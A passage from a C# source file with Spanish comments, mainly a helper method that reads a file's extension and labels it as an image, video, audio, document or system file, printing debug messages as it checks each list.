                return "[-]"; // Hubo un problema 
            }

        }
        private static string GetFileType(string File) {
            /* Utiliza la variable para obtener el ultimo contendor 
             * =Ejemplo:
             * [Antes]    path = "SoyUnaImagen.png" 
             * [Despues]  path =  "[Imagen]"             */
            if (File == "[-]") {
                return "[-]";
            }

            string dir = GetFileName(File);
            //string dir2 = dir;       // Solo antibuggeo
            try {
                int palabraClave = dir.LastIndexOf(".");
                dir = dir.Substring(palabraClave + 1);
            } catch {
                return "[-]";
            }

            // Convierte la extensión en minuscula.
            dir = dir.ToLower();
            String[] video = { "gif", "mp4", "avi", "div", "m4v", "mov", "mpg", "mpeg", "qt", "wmv", "webm", "flv", "3gp" };
            String[] audio = { "midi", "mp1", "mp2", "mp3", "wma", "ogg", "au", "m4a", "flac" };
            String[] doc = { "doc", "docx", "txt", "log", "ppt", "pptx", "pdf", "xlxs", "xlx", "psd", "csv" };
            String[] imagen = { "jpg", "jpeg", "png", "bmp", "ico", "jpe", "jpe" };
            String[] system = { "ani", "bat", "bfc", "bkf", "blg", "cat", "cer", "cfg", "chm", "chk", "clp", "cmd", "cnf", "com", "cpl", "crl", "crt", "cur", "dat", "db",
                                "der", "dll", "drv", "ds", "dsn" , "dun","exe","fnd","fng","fon","grp","hlp","ht","inf","ini","ins","isp","job","key","lnk","msi","msp","msstyles",
                                "nfo","ocx","otf","p7c","pfm","pif","pko","pma","pmc","pml","pmr","pmw","pnf","psw","qds","rdp","reg","scf","scr","sct","shb","shs","sys","theme",
                                "tmp","ttc","ttf","udl","vxd","wab","wmdb","wme","wsc","wsf","wsh","zap"};

            // Verifica si el archivo es una imagen
            foreach (string ext in imagen) {
                if (ext == dir) {
                    Console.WriteLine("\n" + dir + " <= es una Imagen");  // Solo debug
                    return "[Imagen]";
                }
                Console.WriteLine(dir + " <= No es [Imagen] ");  // Solo debug
            }
            // Verifica si el archivo es una video 
            foreach (string ext in video) {
                if (ext == dir) {
                    Console.WriteLine("\n" + dir + " <= es un Video");  // Solo debug
                    return "[Video]";
                }
                Console.WriteLine(dir + " <= No es [Video] ");  // Solo debug
            }
            // Verifica si el archivo es un Adudio
            foreach (string ext in audio) {
                if (ext == dir) {
                    Console.WriteLine("\n" + dir + " <= es un Audio");  // Solo debug
                    return "[Audio]";
                }
                Console.WriteLine(dir + " <= No es [Audio] ");  // Solo debug
            }
            // Verifica si el archivo es un Documento
            foreach (string ext in doc) {
                if (ext == dir) {
                    Console.WriteLine("\n" + dir + " <= es un Documento");  // Solo debug
                    return "[Doc]";
                }
                Console.WriteLine(dir + " <= No es [Doc] ");  // Solo debug
            }
            // Verifica si el archivo es un Documento
            foreach (string ext in system) {
                if (ext == dir) {
                    Console.WriteLine("\n" + dir + " <= es un System");  // Solo debug
                    return "[System]";
                }
                Console.WriteLine(dir + " <= No es [System] ");  // Solo debug
            }

            return "[-]"; // Extension File
        }

        #endregion 

    }
}
